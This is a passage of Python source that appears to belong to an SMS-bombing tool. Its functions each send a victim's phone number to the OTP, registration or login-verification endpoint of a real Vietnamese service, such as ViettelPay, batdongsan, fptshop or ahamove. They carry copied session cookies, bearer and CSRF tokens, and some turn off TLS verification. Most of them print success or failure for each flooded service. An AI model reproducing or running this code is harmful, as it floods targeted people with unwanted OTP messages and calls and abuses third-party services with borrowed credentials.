        'referer': 'https://www.nhaphang247.com/huong-dan-dat-hang?utm_source=google&utm_medium=keywords&utm_campaign=adwords&gclid=CjwKCAjwvdajBhBEEiwAeMh1UxijuF0_CKBBxKbFdMnmwUJPYVEImG1ceVzqbqt-_lVI91dNMUyOihoCPukQAvD_BwE',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x',
    }

    response = requests.post('https://www.nhaphang247.com/site/get-code', cookies=cookies, headers=headers, data=data)
    
    
def sms40(phone):
  headers = {
    'Host': 'ubofood.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '54',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache',
    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://ubofood.com',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://ubofood.com/register',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; _ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; _ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
    }
  data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt',phone)
  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text
  
  
def sms41(phone):
    headers = {
        "Host": "api8.viettelpay.vn",
        "product": "VIETTELPAY",
        "accept-language": "vi",
        "authority-party": "APP",
        "channel": "APP",
        "type-os": "android",
        "app-version": "5.1.4",
        "os-version": "10",
        "imei": "VTP_" + generate_random_string(32),
        "x-request-id": "20230803164512",  # Replace with the current date and time in the format "YmdHis"
        "content-type": "application/json; charset=UTF-8",
        "user-agent": "okhttp/4.2.2"
    }

    data = {
        "type": "msisdn",
        "username": phone
    }

    response = requests.post("https://api8.viettelpay.vn/customer/v1/validate/account", json=data, headers=headers, verify=False)
    get_data = response.json()

    if get_data["status"]["code"] == "CS9901":
        data = {
            "hash": "",
            "identityType": "msisdn",
            "identityValue": phone,
            "imei": "VTP_" + generate_random_string(32),
            "notifyToken": "",
            "otp": "android",
            "pin": "VTP_" + generate_random_string(32),
            "transactionId": "",
            "type": "REGISTER",
            "typeOs": "android",
            "verifyMethod": "sms"
        }
        response = requests.post("https://api8.viettelpay.vn/customer/v2/accounts/register", json=data, headers=headers, verify=False)
        get_data = response.json()
    else:
        data = {
            "imei": "VTP_" + generate_random_string(32),
            "loginType": "BASIC",
            "msisdn": phone,
            "otp": "",
            "pin": "VTP_" + generate_random_string(32),
            "requestId": "",
            "typeOs": "android",
            "userType": "msisdn",
            "username": phone
        }
        response = requests.post("https://api8.viettelpay.vn/auth/v1/authn/login", json=data, headers=headers, verify=False)
        get_data = response.json()

    if "Cần xác thực bổ sung OTP" in get_data["status"]["message"] or "Vui lòng nhập mã OTP được gửi về SĐT " + phone + " để xác minh chính chủ" in get_data["status"]["message"]:
        print(format_print("*", "sms41: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms41: THẤT BẠI!"))   
        
        
def sms42(phone):
    cookies = {
        '_cfuvid': 'lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000',
        'con.ses.id': 'cb51616e-d90e-4d43-afff-4a8d4090aaea',
        'cf_clearance': 'JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900',
        '_gid': 'GA1.3.455334370.1693616897',
        '_gat_gtag_UA_3729099_6': '1',
        '_gat_UA-3729099-1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'ECEDsVw9uB_ZcsJoOLvv1Y0mgh3',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_1708983': '0',
        '_hjSession_1708983': 'eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=',
        'con.unl.usr.id': '%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D',
        'con.unl.cli.id': '%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D',
        '_gcl_au': '1.1.716350485.1693616908',
        'desapp': 'sellernet01',
        'SERVERID': '53',
        '_ga': 'GA1.3.177629587.1693616897',
        '_hjSessionUser_1708983': 'eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==',
        '__zi': '2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1',
        'ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9': '%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D',
        '_ga_HTS298453C': 'GS1.1.1693616898.1.1.1693616926.32.0.0',
    }

    headers = {
        'authority': 'm.batdongsan.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        # 'cookie': '_cfuvid=lDZgITpXJ8dt8dz1xxZJ2eO1jjTsLRNQz1EYGUtvHD8-1693616884672-0-604800000; con.ses.id=cb51616e-d90e-4d43-afff-4a8d4090aaea; cf_clearance=JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900; _gid=GA1.3.455334370.1693616897; _gat_gtag_UA_3729099_6=1; _gat_UA-3729099-1=1; _tt_enable_cookie=1; _ttp=ECEDsVw9uB_ZcsJoOLvv1Y0mgh3; _hjFirstSeen=1; _hjIncludedInSessionSample_1708983=0; _hjSession_1708983=eyJpZCI6IjAyZmM1ODM1LTcyNmQtNGViNC1hZjcwLTQwM2RkMTQ1NmNhNyIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODgsImluU2FtcGxlIjpmYWxzZX0=; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%229e211272-4290-4e80-a51d-792eb9dc3989%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037584Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22452b0e1f-b525-4c00-b9f0-47fb464a55fb%22%2C%22expireDate%22%3A%222024-09-01T08%3A08%3A31.9037858Z%22%7D; _gcl_au=1.1.716350485.1693616908; desapp=sellernet01; SERVERID=53; _ga=GA1.3.177629587.1693616897; _hjSessionUser_1708983=eyJpZCI6IjFhYTZhNmIxLWNhNDgtNTJmNS05NmY2LTNjYTIzNzI3MzQ5MiIsImNyZWF0ZWQiOjE2OTM2MTY5MDQzODQsImV4aXN0aW5nIjp0cnVlfQ==; __zi=2000.SSZzejyD6jy_Zl2jp1eKttQU_gxC3nMGTChWuC8NLyncmFxoW0L1tccUzlJCG47POP_mzy84HDrlqFVmpGv0sJCsE0.1; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%224d8900df-674c-335e-950a-217f9fa7a2db%22%2C%22c%22%3A1693616925481%2C%22l%22%3A1693616925481%7D; _ga_HTS298453C=GS1.1.1693616898.1.1.1693616926.32.0.0',
        'dnt': '1',
        'referer': 'https://m.batdongsan.com.vn/sellernet/trang-dang-ky',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'phoneNumber': phone,
    }

    response = requests.get(
        'https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    print(format_print("*", "sms42: THÀNH CÔNG!"))
    
    
def sms43(phone):
    headers = {
        "Host": "id.icankid.vn",
        "Connection": "keep-alive",
        "Content-Length": "134",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://id.icankid.vn",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://id.icankid.vn/auth",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4",
        "Cookie": "_ga_LM3PQNHV6S=GS1.1.1683042907.1.0.1683042907.60.0.0; _gcl_au=1.1.888294803.1683042909; _ga_JLL9R732MK=GS1.1.1683042909.1.0.1683042909.0.0.0; _ga_FMXKZXNRJB=GS1.1.1683042909.1.0.1683042909.60.0.0; _hjSessionUser_3154488=eyJpZCI6IjFlZDBjZjEzLTk1NTYtNWFiYi1hNjZkLWVhYzZhMmJkYTljZCIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5NDYsImV4cCI6ZmFsc2V9; _hjFirstSeen=1; _hjIncludedInSessionSample_3154488=0; _hjSession_3154488=eyJpZCI6IjJlZmFjYjk2LWQ4NWEtNGY3NC1iYjdiLWEyMjRmNDQ5YzQ3YiIsImNyZWF0ZWQiOjE2ODMwNDI5MDk5ODMsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; _gid=GA1.2.665729834.1683042910; _gat_gtag_UA_201462250_4=1; _gat_UA-222516876-1=1; _fbp=fb.1.1683042910188.410123624; _ga_T14T78MGX8=GS1.1.1683042910.1.0.1683042910.0.0.0; _ga=GA1.1.820789589.1683042908; _ga_5KHZV6MD4J=GS1.1.1683042915.1.0.1683042916.0.0.0; _ga=GA1.3.820789589.1683042908; _gid=GA1.3.665729834.1683042910; _gat_UA-213798897-3=1"
    }
    
    data = {
        "phone": phone,
        "challenge_code": "674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00",
        "challenge_method": "SHA256"
    }
    response = requests.post("https://id.icankid.vn/api/otp/challenge/", json=data, headers=headers)
    
    if response.ok:
        print(format_print("*", "sms43: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms43: THẤT BẠI!"))   
        
        
def sms44(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"cocailondjtcmm12@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
  
  
def vdh10():
    cookies = {
        '_gcl_au': '1.1.1584248520.1696863191',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%228uHHQLF5lZCi1qTk9h8J%22%7D',
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '5ed1bba7-e921-4ad8-b843-61ea3420e241',
        'fpt_uuid': '%223cf7fba4-7700-46f5-bdea-ba209b50741d%22',
        'ajs_group_id': 'null',
        '_fbp': 'fb.2.1696863192654.1366932249',
        '__admUTMtime': '1696863193',
        '_tt_enable_cookie': '1',
        '_ttp': '3DAP_8ozJu_gH2HMjQKwLPP0ShR',
        'dtdz': '360b50d3-59a3-4318-bee1-cbab53ae7577',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__RC': '9',
        '__R': '1',
        '_gid': 'GA1.3.1044239947.1697099994',
        '_gat': '1',
        '_ga': 'GA1.1.2116445144.1696863191',
        'vMobile': '1',
        'cf_clearance': 'Ds.rUZtwAZFA0tmnNCgYdgRF67Ey9H2vycwdrDWu1LQ-1697099996-0-1-1887654.1cf5104b.568929b4-0.2.1697099996',
        '_hjSessionUser_731679': 'eyJpZCI6ImIwNmY4ZGNjLTY5NzctNTkxYS1hYTM5LTE1Mzk1NTBhNmQ4MiIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNDUsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6IjI2OWQwNDE3LTBmOGUtNDBkMC05MDM0LWY2YjAzOTRmM2QxMCIsImNyZWF0ZWQiOjE2OTcwOTk5OTgxODgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_hjAbsoluteSessionInProgress': '0',
        '__uif': '__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163',
        '__tb': '0',
        '__IP': '1952826262',
        '_ga_ZR815NQ85K': 'GS1.1.1697099994.2.0.1697100005.49.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_gcl_au=1.1.1584248520.1696863191; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%228uHHQLF5lZCi1qTk9h8J%22%7D; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=5ed1bba7-e921-4ad8-b843-61ea3420e241; fpt_uuid=%223cf7fba4-7700-46f5-bdea-ba209b50741d%22; ajs_group_id=null; _fbp=fb.2.1696863192654.1366932249; __admUTMtime=1696863193; _tt_enable_cookie=1; _ttp=3DAP_8ozJu_gH2HMjQKwLPP0ShR; dtdz=360b50d3-59a3-4318-bee1-cbab53ae7577; __iid=; __iid=; __su=0; __su=0; __RC=9; __R=1; _gid=GA1.3.1044239947.1697099994; _gat=1; _ga=GA1.1.2116445144.1696863191; vMobile=1; cf_clearance=Ds.rUZtwAZFA0tmnNCgYdgRF67Ey9H2vycwdrDWu1LQ-1697099996-0-1-1887654.1cf5104b.568929b4-0.2.1697099996; _hjSessionUser_731679=eyJpZCI6ImIwNmY4ZGNjLTY5NzctNTkxYS1hYTM5LTE1Mzk1NTBhNmQ4MiIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNDUsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6IjI2OWQwNDE3LTBmOGUtNDBkMC05MDM0LWY2YjAzOTRmM2QxMCIsImNyZWF0ZWQiOjE2OTcwOTk5OTgxODgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=0; __uif=__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163; __tb=0; __IP=1952826262; _ga_ZR815NQ85K=GS1.1.1697099994.2.0.1697100005.49.0.0',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)


def vdh9():
    cookies = {
        'mp_376a95ebc99b460db45b090a5936c5de_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24device_id%22%3A%20%2218b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2F%22%2C%22%24initial_referring_domain%22%3A%20%22bibabo.vn%22%7D',
        '_gid': 'GA1.2.1929928144.1697100118',
        '_gat': '1',
        '_ga': 'GA1.1.1718406591.1697100118',
        '_fbp': 'fb.1.1697100118139.2114864606',
        'gaVisitorUuid': '9f81e315-5518-45e8-b139-bbf8b35999db',
        '_ga_6LQ4PSBDW0': 'GS1.2.1697100118.1.0.1697100118.60.0.0',
        'auth.strategy': 'cookie',
        'i18n_redirected': 'vn',
        '_ga_B05J0DJ8VM': 'GS1.1.1697100118.1.0.1697100122.0.0.0',
        'XSRF-TOKEN': 'eyJpdiI6InorNlNlSXl1V1h5OEtMUiticnNleGc9PSIsInZhbHVlIjoidktPRG1lZlwvSFVEQjVJckFlNjdWZmJmMk1iazNMQVwvNk1iYzA2elZcL29WbUhFSHUycVVSQ2phV1BXaTdyVkoxSSIsIm1hYyI6IjZlZmY4ZGMxMmQ4ZDAyNDJjOThkMWI3YzQ3ZjY2NzY0OWRlODYyMDY1YzlkM2ZjYjRhNDEwM2VkZjZlNzU2N2UifQ%3D%3D',
        'onebibabovn_session': 'm0ORorko8A2c7EeWeGVsMRVBbOHGi3ch62W7Xz4X',
    }

    headers = {
        'authority': 'edu.bibabo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'access-control-allow-credentials': 'true',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': 'mp_376a95ebc99b460db45b090a5936c5de_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24device_id%22%3A%20%2218b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2F%22%2C%22%24initial_referring_domain%22%3A%20%22bibabo.vn%22%7D; _gid=GA1.2.1929928144.1697100118; _gat=1; _ga=GA1.1.1718406591.1697100118; _fbp=fb.1.1697100118139.2114864606; gaVisitorUuid=9f81e315-5518-45e8-b139-bbf8b35999db; _ga_6LQ4PSBDW0=GS1.2.1697100118.1.0.1697100118.60.0.0; auth.strategy=cookie; i18n_redirected=vn; _ga_B05J0DJ8VM=GS1.1.1697100118.1.0.1697100122.0.0.0; XSRF-TOKEN=eyJpdiI6InorNlNlSXl1V1h5OEtMUiticnNleGc9PSIsInZhbHVlIjoidktPRG1lZlwvSFVEQjVJckFlNjdWZmJmMk1iazNMQVwvNk1iYzA2elZcL29WbUhFSHUycVVSQ2phV1BXaTdyVkoxSSIsIm1hYyI6IjZlZmY4ZGMxMmQ4ZDAyNDJjOThkMWI3YzQ3ZjY2NzY0OWRlODYyMDY1YzlkM2ZjYjRhNDEwM2VkZjZlNzU2N2UifQ%3D%3D; onebibabovn_session=m0ORorko8A2c7EeWeGVsMRVBbOHGi3ch62W7Xz4X',
        'origin': 'https://edu.bibabo.vn',
        'referer': 'https://edu.bibabo.vn/signup',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-xsrf-token': 'eyJpdiI6InorNlNlSXl1V1h5OEtMUiticnNleGc9PSIsInZhbHVlIjoidktPRG1lZlwvSFVEQjVJckFlNjdWZmJmMk1iazNMQVwvNk1iYzA2elZcL29WbUhFSHUycVVSQ2phV1BXaTdyVkoxSSIsIm1hYyI6IjZlZmY4ZGMxMmQ4ZDAyNDJjOThkMWI3YzQ3ZjY2NzY0OWRlODYyMDY1YzlkM2ZjYjRhNDEwM2VkZjZlNzU2N2UifQ==',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://edu.bibabo.vn/api/v1/web/auth/verifyPhone/requestOtp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if response.status_code == 200:
        print(format_print("*", "vdh9: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh9: THẤT BẠI!"))   
        
        
def vdh8():
    headers = {
        'authority': 'api.itaphoa.com',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'origin': 'https://shop.mioapp.co',
        'referer': 'https://shop.mioapp.co/',
        'region-code': 'HCM',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'phone': phone,
        'type': 'call',
    }

